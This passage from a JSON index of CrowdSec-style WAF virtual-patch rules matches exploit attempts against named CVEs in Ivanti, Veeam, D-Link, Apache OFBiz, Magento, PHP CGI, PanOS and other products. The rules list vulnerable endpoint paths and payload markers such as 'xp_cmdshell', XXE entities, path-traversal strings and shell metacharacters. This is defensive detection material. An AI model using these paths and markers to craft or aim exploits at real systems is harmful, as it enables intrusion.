"appsec-rules/crowdsecurity/vpatch-CVE-2024-29028.yaml", "version": "0.1", "versions": {"0.1": {"digest": "34e79ecc4a06e3d44f0b99d1c798c542fe60a7e04db02824126f88e1b0c06947"}}}, "crowdsecurity/vpatch-CVE-2024-29824": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-29824\ndescription: \"Ivanti EPM - SQLi (CVE-2024-29824)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /wsstatusevents/eventhandler.asmx\n    - zones:\n      - RAW_BODY\n      match:\n        type: contains\n        value: \"xp_cmdshell\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Ivanti EPM - SQLi\"\n  classification:\n   - cve.CVE-2024-29824\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "Ivanti EPM - SQLi (CVE-2024-29824)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-29824.yaml", "version": "0.1", "versions": {"0.1": {"digest": "77c1114599436db48fafcafd5ff072e7c6c24fca0b54f2d656aa910205b6f7df"}}}, "crowdsecurity/vpatch-CVE-2024-29849": {"content": "name: crowdsecurity/vpatch-CVE-2024-29849\ndescription: \"Veeam Backup Enterprise Manager - Authentication Bypass (CVE-2024-29849)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      match:\n        type: endsWith\n        value: /api/sessionMngr/\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - ARGS\n      variables:\n        - v\n      match:\n        type: equals\n        value: \"latest\"\n    - zones:\n      - BODY_ARGS\n      transform:\n        - b64decode\n      variables:\n        - json.VMwareSSOToken\n      match:\n        type: contains\n        value: \"<saml2:Assertion\"\n    - zones:\n        - BODY_ARGS\n      variables:\n        - json.VMwareSSOToken\n      transform:\n        - b64decode\n      match:\n        type: contains\n        value: \"<saml2:Issuer\"\n    - zones:\n        - BODY_ARGS\n      variables:\n        - json.VMwareSSOToken\n      transform:\n        - b64decode\n      match:\n        type: contains\n        value: \"/STSService\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Veeam Backup Enterprise Manager - Authentication Bypass\"\n  classification:\n    - cve.CVE-2024-29849\n    - attack.T1595\n    - attack.T1190\n", "description": "Veeam Backup Enterprise Manager - Authentication Bypass (CVE-2024-29849)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-29849.yaml", "version": "0.5", "versions": {"0.1": {"digest": "dccb1c216bd7e1fe2a6e4c548a2cf9aae838f3ef80174da033af8b3fe86c430f"}, "0.2": {"digest": "82da392ff81184e838cf1475fdd28b137d370c051bcfe4fbdf03df5a48fa41ad"}, "0.3": {"digest": "ee9ed9684f31a99dbfb97d9bc4b3f851246d2a0d1b61931f95a6a1ef8dfdbc28"}, "0.4": {"digest": "41264049fd3e68d4de01d0affd78683db6fe2cec893a3eff7700daca576115b3"}, "0.5": {"digest": "5b93138e827ea3b8dad92c30d436fe0dc0ce8eba379a95b93a782be974addccd"}}}, "crowdsecurity/vpatch-CVE-2024-29973": {"content": "name: crowdsecurity/vpatch-CVE-2024-29973\ndescription: \"Zyxel - RCE (CVE-2024-29973)\"\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: /cmd,/simzysh/register_main/setcookie\n      - zones:\n          - ARGS\n          - BODY_ARGS\n        variables:\n          - c0\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \"storage_ext_cgi\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Zyxel - RCE\"\n  classification:\n    - cve.CVE-2024-29973\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-78\n", "description": "Zyxel - RCE (CVE-2024-29973)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-29973.yaml", "version": "0.1", "versions": {"0.1": {"digest": "442ddc3f0db71ab673b72aec4da04bd74b93b713fb879b85d796e2c7521cbd71"}}}, "crowdsecurity/vpatch-CVE-2024-32113": {"content": "name: crowdsecurity/vpatch-CVE-2024-32113\ndescription: \"Apache OFBiz - Path Traversal (CVE-2024-32113)\"\nrules:\n  - and:\n      - zones:\n          - METHOD\n        match:\n          type: equals\n          value: POST\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: /webtools/control/forgotpassword;/programexport\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Apache OFBiz - Path Traversal\"\n  classification:\n    - cve.CVE-2024-32113\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-22\n", "description": "Apache OFBiz - Path Traversal (CVE-2024-32113)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-32113.yaml", "version": "0.1", "versions": {"0.1": {"digest": "20d3a940db05d005ee4c49d1f79f5f62b84e54e244938aff08272297db673106"}}}, "crowdsecurity/vpatch-CVE-2024-3272": {"content": "name: crowdsecurity/vpatch-CVE-2024-3272\ndescription: \" D-Link NAS - RCE (CVE-2024-3272)\" #UPDATE THIS\nrules:\n  - and:\n      - zones:\n          - METHOD\n        match:\n          type: equals\n          value: GET\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: endsWith\n          value: /cgi-bin/nas_sharing.cgi\n      - zones:\n          - ARGS\n        variables:\n          - cmd\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: \"15\"\n      - zones:\n          - ARGS_NAMES\n        match:\n          type: equals\n          value: system\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \" D-Link NAS - RCE\" #UPDATE THIS\n  classification:\n    - cve.CVE-2024-3272\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-287\n", "description": " D-Link NAS - RCE (CVE-2024-3272)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-3272.yaml", "version": "0.1", "versions": {"0.1": {"digest": "ed43876261d4b14056a73ff1ab5aacb1d2b2cb4e070aa312775f38f98108fbcb"}}}, "crowdsecurity/vpatch-CVE-2024-3273": {"content": "name: crowdsecurity/vpatch-CVE-2024-3273\ndescription: \"D-LINK NAS Command Injection (CVE-2024-3273)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: cgi-bin/nas_sharing.cgi\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - ARGS_NAMES\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: system\n    - zones:\n      - ARGS\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: messagebus\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"D-LINK NAS Command Injection\"\n  classification:\n   - cve.CVE-2024-3273\n   - attack.T1595\n   - attack.T1190", "description": "D-LINK NAS Command Injection (CVE-2024-3273)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-3273.yaml", "version": "0.1", "versions": {"0.1": {"digest": "0a1253f1474fdf2cdf5cba1abf2e8027bde2122360d3d340f43569f79221b44b"}}}, "crowdsecurity/vpatch-CVE-2024-32870": {"content": "## autogenerated on 2025-05-09 09:19:00\nname: crowdsecurity/vpatch-CVE-2024-32870\ndescription: 'Detects unauthorized access to iTop Hub Connector information disclosure endpoint.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /pages/exec.php\n      - zones:\n          - ARGS\n        variables:\n          - exec_module\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: equals\n          value: itop-hub-connector\n      - zones:\n          - ARGS\n        variables:\n          - exec_page\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: equals\n          value: launch.php\n      - zones:\n          - ARGS\n        variables:\n          - target\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: equals\n          value: inform_after_setup\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'ITop - Information Disclosure'\n  classification:\n    - cve.CVE-2024-32870\n    - attack.T1592\n    - cwe.CWE-200\n", "description": "Detects unauthorized access to iTop Hub Connector information disclosure endpoint.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-32870.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7c5a5eb752920e5e7d74548e9c5c8983ec4603afef0030aec15ba1cfb23e28d9"}}}, "crowdsecurity/vpatch-CVE-2024-34102": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-34102\ndescription: \"Adobe Commerce & Magento - XXE (CVE-2024-34102)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      transform:\n      - uppercase\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /rest/v1/guest-carts/1/estimate-shipping-methods\n    - zones:\n      - BODY_ARGS\n      variables:\n      - json.address.totalsCollector.collectorList.totalCollector.sourceData.data\n      transform:\n        - lowercase\n      match:\n        type: contains\n        value: \"<!entity\"\n  - and:\n    - zones:\n      - METHOD\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: post\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /rest/v1/guest-carts/1/estimate-shipping-methods\n    - zones:\n      - BODY_ARGS\n      variables:\n      - json.address.totalsCollector.collectorList.totalCollector.sourceData.data\n      transform:\n        - lowercase\n      match:\n        type: contains\n        value: \"://\"\n    - zones:\n      - BODY_ARGS\n      variables:\n      - json.address.totalsCollector.collectorList.totalCollector.sourceData.dataIsURL\n      transform:\n        - lowercase\n      match:\n        type: equals\n        value: \"true\"\n\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Adobe Commerce & Magento - XXE\"\n  classification:\n   - cve.CVE-2024-34102\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-611", "description": "Adobe Commerce & Magento - XXE (CVE-2024-34102)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-34102.yaml", "version": "0.1", "versions": {"0.1": {"digest": "607a26132ba2ff5c5950280f93cc087f2fe3875f1e1801219f5eed4b86be64b4"}}}, "crowdsecurity/vpatch-CVE-2024-38816": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-38816\ndescription: \"Spring - Path Traversal (CVE-2024-38816)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: \"/static/link/../\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Spring - Path Traversal\"\n  classification:\n   - cve.CVE-2024-38816\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-22", "description": "Spring - Path Traversal (CVE-2024-38816)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-38816.yaml", "version": "0.2", "versions": {"0.1": {"digest": "3f0f9436351950cb8c7072ed57f50100ecfd7c4a5fe78951af09c43e52470570"}, "0.2": {"digest": "0035d104987f03709616bf5e64c8ec2516be6e5b3e97aaffde78cea7d1ce85b9"}}}, "crowdsecurity/vpatch-CVE-2024-38856": {"content": "name: crowdsecurity/vpatch-CVE-2024-38856\ndescription: \"Apache OFBiz Incorrect Authorization (CVE-2024-38856)\"\nrules:\n  - and:\n      - zones:\n          - METHOD\n        match:\n          type: regex\n          value: (GET|POST)\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: regex\n          value: /webtools/control/(main|view|testservice|showdatetime|forgotpassword)/programexport\n      - zones:\n          - BODY_ARGS\n          - ARGS\n        variables:\n          - groovyProgram\n        transform:\n          - count\n        match:\n          type: gte\n          value: 1\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Apache OFBiz Incorrect Authorization\"\n  classification:\n    - cve.CVE-2024-38856\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-853\n", "description": "Apache OFBiz Incorrect Authorization (CVE-2024-38856)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-38856.yaml", "version": "0.1", "versions": {"0.1": {"digest": "de76534f173e4eb876dde957244121298f3032e074f2832615e9fb5c84a7f067"}}}, "crowdsecurity/vpatch-CVE-2024-41713": {"content": "name: crowdsecurity/vpatch-CVE-2024-41713\ndescription: \"Mitel MiCollab - Path Traversal (CVE-2024-41713)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: \"/npm-pwg/..;\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Mitel MiCollab - Path Traversal\"\n  classification:\n   - cve.CVE-2024-41713\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-22", "description": "Mitel MiCollab - Path Traversal (CVE-2024-41713)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-41713.yaml", "version": "0.2", "versions": {"0.1": {"digest": "7f93713760cc700f276599099457cb4c2806e723e740cadc590e5aa4ef8f0630"}, "0.2": {"digest": "866b75c309aa6838be0f6dc1d191fb99b824e9e60ba8aa6d31c38b96d1ea496c"}}}, "crowdsecurity/vpatch-CVE-2024-4577": {"content": "name: crowdsecurity/vpatch-CVE-2024-4577\ndescription: \"PHP CGI Command Injection - CVE-2024-4577\"\nrules:\n  - and:\n    - zones:\n      - URI_FULL\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: \"?%ad\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"PHP CGI Command Injection - CVE-2024-4577\"\n  classification:\n   - cve.CVE-2024-4577\n   - attack.T1595\n   - attack.T1190\n   - attack.T1059\n   - cwe.CWE-74\n   - cwe.CWE-88\n   - cwe.CWE-707\n\n\n", "description": "PHP CGI Command Injection - CVE-2024-4577", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-4577.yaml", "version": "0.1", "versions": {"0.1": {"digest": "c68e38d0721f936f1596d81fcc0794298f45ec9096b188218bda1a592dd36287"}}}, "crowdsecurity/vpatch-CVE-2024-46506": {"content": "## autogenerated on 2025-09-24 14:37:36\nname: crowdsecurity/vpatch-CVE-2024-46506\ndescription: 'Detects unauthenticated command injection in NetAlertX via function=savesettings in util.php'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /php/server/util.php\n      - zones:\n          - BODY_ARGS\n        variables:\n          - function\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: savesettings\n      - zones:\n          - BODY_ARGS\n        variables:\n          - settings\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: 'dbclnp_cmd'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Netalertx - RCE'\n  classification:\n    - cve.CVE-2024-46506\n    - attack.T1190\n    - cwe.CWE-306\n", "description": "Detects unauthenticated command injection in NetAlertX via function=savesettings in util.php", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-46506.yaml", "version": "0.1", "versions": {"0.1": {"digest": "f0078a6c6bfe086b7a50660cd932d7cd449ec16648975b98489614ef4875f58d"}}}, "crowdsecurity/vpatch-CVE-2024-51378": {"content": "name: crowdsecurity/vpatch-CVE-2024-51378\ndescription: \"Cyberpanel - RCE (CVE-2024-51378)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: regex\n        value: /(dns|ftp)/getresetstatus\n    - zones:\n      - BODY_ARGS\n      variables:\n       - json.statusfile\n      match:\n        type: regex\n        value: \"[^a-zA-Z0-9/]\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Cyberpanel - RCE\"\n  classification:\n   - cve.CVE-2024-51378\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-78", "description": "Cyberpanel - RCE (CVE-2024-51378)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-51378.yaml", "version": "0.1", "versions": {"0.1": {"digest": "653a11bcbffccf620fa6d9875de7693f012fb9236f1c1c81cb85c26e3a34e7f2"}}}, "crowdsecurity/vpatch-CVE-2024-51567": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-51567\ndescription: \"CyberPanel RCE (CVE-2024-51567)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: /databases/upgrademysqlstatus\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: PUT\n    - zones:\n      - BODY_ARGS\n      transform:\n        - lowercase\n        - urldecode\n      variables:\n       - json.statusfile\n      match:\n        type: contains\n        value: ';'\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"CyberPanel RCE\"\n  classification:\n   - cve.CVE-2024-51567\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-306\n   - cwe.CWE-276", "description": "CyberPanel RCE (CVE-2024-51567)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-51567.yaml", "version": "0.1", "versions": {"0.1": {"digest": "99ef5af971e1263bdf18201229b8cd004f9aec0643a9ef9dbc824a2e2f5be43a"}}}, "crowdsecurity/vpatch-CVE-2024-51977": {"content": "## autogenerated on 2025-08-06 13:49:44\nname: crowdsecurity/vpatch-CVE-2024-51977\ndescription: 'Detects unauthenticated access to sensitive information disclosure endpoint /etc/mnt_info.csv on Brother MFC-L9570CDW devices.'\nrules:\n  - zones:\n      - URI\n    transform:\n      - lowercase\n      - urldecode\n    match:\n      type: equals\n      value: '/etc/mnt_info.csv'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Brother MFC-L9570CDW - Information Disclosure'\n  classification:\n    - cve.CVE-2024-51977\n    - attack.T1592\n    - cwe.CWE-200\n", "description": "Detects unauthenticated access to sensitive information disclosure endpoint /etc/mnt_info.csv on Brother MFC-L9570CDW devices.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-51977.yaml", "version": "0.1", "versions": {"0.1": {"digest": "e8ace865f68696980fc837decf0db00f1c588c6c0e2146df4014004cbd8185c1"}}}, "crowdsecurity/vpatch-CVE-2024-52301": {"content": "name: crowdsecurity/vpatch-CVE-2024-52301\ndescription: \"Laravel - Parameter Injection (CVE-2024-52301)\"\nrules:\n  - and:\n    - zones:\n      - ARGS_NAMES\n      match:\n        type: endsWith\n        value: \"--env\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Laravel - Parameter Injection\"\n  classification:\n   - cve.CVE-2024-52301\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-88\n", "description": "Laravel - Parameter Injection (CVE-2024-52301)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-52301.yaml", "version": "0.1", "versions": {"0.1": {"digest": "939ac16b02348d9f1295dfaeaa9254def91eb3b31b7d4c637905664682ca4cee"}}}, "crowdsecurity/vpatch-CVE-2024-57727": {"content": "## autogenerated on 2025-03-28 15:52:48\nname: crowdsecurity/vpatch-CVE-2024-57727\ndescription: 'Detects unauthenticated path traversal attempts targeting SimpleHelp <= 5.5.7'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /toolbox-resource/../\nlabels:\n  type: vulnerability\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'SimpleHelp - Path Traversal'\n  classification:\n    - cve.CVE-2024-57727\n    - attack.T1190\n    - cwe.CWE-22\n", "description": "Detects unauthenticated path traversal attempts targeting SimpleHelp <= 5.5.7", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-57727.yaml", "version": "0.4", "versions": {"0.1": {"digest": "ed97a19f1a1df8a2d92beb360a404c45e5f1947a8b1dc548ba0525c72a1cc0a1"}, "0.2": {"digest": "6348636e75a7a714393bbb8bbf1cf7ae4fdeaa436ce0883958fd7bcfc7cb6016"}, "0.3": {"digest": "1335e4420bcab6421f5466bb95d28c25f3904c42bd2d5a5eff5607c9e819939c"}, "0.4": {"digest": "b8b0a05c54f7f9cc925b7a10d88d9b0fa7465c5b6b9bc5f047c019c12d9ba092"}}}, "crowdsecurity/vpatch-CVE-2024-6205": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-6205\ndescription: \"PayPlus Payment Gateway WordPress plugin - SQL Injection (CVE-2024-6205)\"\nrules:\n  - and:\n    - zones:\n      - ARGS\n      variables:\n      - wc-api\n      transform:\n      - lowercase\n      match:\n        type: \"contains\"\n        value: \"payplus_gateway\"\n    - zones:\n      - ARGS\n      variables:\n      - more_info\n      transform:\n      - lowercase\n      match:\n        type: libinjectionSQL\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"PayPlus Payment Gateway WordPress plugin - SQL Injection\"\n  classification:\n   - cve.CVE-2024-6205\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "PayPlus Payment Gateway WordPress plugin - SQL Injection (CVE-2024-6205)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-6205.yaml", "version": "0.2", "versions": {"0.1": {"digest": "b7960ec163530345d342eb3a21844864c90d9d41699254c8611e8491046a1efa"}, "0.2": {"digest": "770af7b15eadfaf214752d09af1d859f0c80a4fbe55cf695011e4156ab781c44"}}}, "crowdsecurity/vpatch-CVE-2024-7593": {"content": "name: crowdsecurity/vpatch-CVE-2024-7593\ndescription: \"Ivanti vTM - Authentication Bypass (CVE-2024-7593)\"\nrules:\n  - and:\n    - zones:\n        - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n        - URI\n      transform:\n        - lowercase\n      match:\n        type: endsWith\n        value: /apps/zxtm/wizard.fcgi\n    - zones:\n        - ARGS\n      variables:\n        - section\n      transform:\n        - lowercase\n        - urldecode\n      match:\n        type: equals\n        value: \"access management:localusers\"\n    - zones:\n        - ARGS\n      variables:\n        - error\n      transform:\n        - lowercase\n      match:\n        type: equals\n        value: 1\n    - zones:\n        - BODY_ARGS\n      variables:\n        - create_user\n      match:\n        type: equals\n        value: Create\n    - zones:\n        - BODY_ARGS\n      variables:\n        - group\n      match:\n        type: equals\n        value: admin\n    - zones:\n        - BODY_ARGS\n      variables:\n        - newusername\n      match:\n        type: regex\n        value: ^.*$\n    - zones:\n        - BODY_ARGS\n      variables:\n        - password1\n      match:\n        type: regex\n        value: ^.*$\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Ivanti vTM - Authentication Bypass\"\n  classification:\n    - cve.CVE-2024-7593\n    - attack.T1190\n    - cwe.CWE-287\n    - cwe.CWE-303", "description": "Ivanti vTM - Authentication Bypass (CVE-2024-7593)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-7593.yaml", "version": "0.1", "versions": {"0.1": {"digest": "150dab77481d68e06e7c1214584d7724a66249394fcf72e493880a541fb59517"}}}, "crowdsecurity/vpatch-CVE-2024-8190": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-8190\ndescription: \"Ivanti Cloud Services Appliance - RCE (CVE-2024-8190)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /gsb/datetime.php\n    - zones:\n      - BODY_ARGS\n      variables:\n       - TIMEZONE\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: \";\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Ivanti Cloud Services Appliance - RCE\"\n  classification:\n   - cve.CVE-2024-8190\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-78", "description": "Ivanti Cloud Services Appliance - RCE (CVE-2024-8190)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-8190.yaml", "version": "0.1", "versions": {"0.1": {"digest": "cd59cd1ada47411f0b12408c87f6c8137bb33ae8754d36bc041f59d85c87e115"}}}, "crowdsecurity/vpatch-CVE-2024-8963": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-8963\ndescription: \"Ivanti CSA - Path Traversal (CVE-2024-8963)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: \"index.php?.php/\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Ivanti CSA - Path Traversal\"\n  classification:\n   - cve.CVE-2024-8963\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-22", "description": "Ivanti CSA - Path Traversal (CVE-2024-8963)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-8963.yaml", "version": "0.2", "versions": {"0.1": {"digest": "17a88de3d293b0b65b4090e5755c8c36bae14da37316955f60a8fbc2f0a98ab6"}, "0.2": {"digest": "866b0c4f9433188937e9823c290c42ef2b857dd333c4a0b5131c29511975232b"}}}, "crowdsecurity/vpatch-CVE-2024-9465": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-9465\ndescription: \"Palo Alto Expedition - SQL Injection (CVE-2024-9465)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: \"/bin/configurations/parsers/checkpoint/checkpoint.php\"\n    - zones:\n      - BODY_ARGS\n      variables:\n      - signatureid\n      transform:\n      - urldecode\n      match:\n        type: regex\n        value: \"[^a-zA-Z0-9]\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Palo Alto Expedition - SQL Injection\"\n  classification:\n   - cve.CVE-2024-9465\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "Palo Alto Expedition - SQL Injection (CVE-2024-9465)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-9465.yaml", "version": "0.2", "versions": {"0.1": {"digest": "dd03339bbb9914dac0ed54ffb47db7688319e7fd5adc0350fafb15c694578d85"}, "0.2": {"digest": "5a59243623d4743896c46163c63e3ad306e1b168624e663098e1ac473f35e80a"}}}, "crowdsecurity/vpatch-CVE-2024-9474": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-9474\ndescription: \"PanOS - Privilege Escalation (CVE-2024-9474)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /php/utils/createremoteappwebsession.php/\n    - zones:\n       - URI\n      transform:\n        - lowercase\n      match:\n        type: endsWith\n        value: .js.map\n    - zones:\n      - BODY_ARGS\n      variables:\n       - user\n      transform:\n      - lowercase\n      match:\n        type: regex\n        value: \"[$;|&`>]\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"PanOS - Privilege Escalation (CVE-2024-9474)\"\n  classification:\n   - cve.CVE-2024-9474\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-78\n", "description": "PanOS - Privilege Escalation (CVE-2024-9474)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-9474.yaml", "version": "0.3", "versions": {"0.1": {"digest": "8460703181c94f6078058c7c9a5f567c161fcc0ce6676d0efc6ab19f3dd5fde3"}, "0.2": {"digest": "8c7edf75d60d36d4b5e8ecb57ea87526ffde766f6e4f95a2a0029c18dc9be03b"}, "0.3": {"digest": "f540b7e6a8e73388c3a045070e3d8b54b4b1b00d005803548e009ff7ff01df0d"}}}, "crowdsecurity/vpatch-CVE-2025-24893": {"content": "## autogenerated on 2025-04-02 10:01:30\nname: crowdsecurity/vpatch-CVE-2025-24893\ndescription: 'Detects arbitrary remote code execution vulnerability in XWiki via SolrSearch.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /bin/get/main/solrsearch\n      - zones:\n          - ARGS\n        variables:\n          - text\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: 'execute('\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'XWiki - RCE'\n  classification:\n    - cve.CVE-2025-24893\n    - attack.T1190\n    - cwe.CWE-95", "description": "Detects arbitrary remote code execution vulnerability in XWiki via SolrSearch.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-24893.yaml", "version": "0.2", "versions": {"0.1": {"digest": "7da53da86dc20df6b74a057d5838e27ad87d799283f52f729cf3655592cd1bda"}, "0.2": {"digest": "dd68ed7903d13c13626ab736d37d9e5c635050661a0613378024be2d97ca3c2c"}}}, "crowdsecurity/vpatch-CVE-2025-25257": {"content": 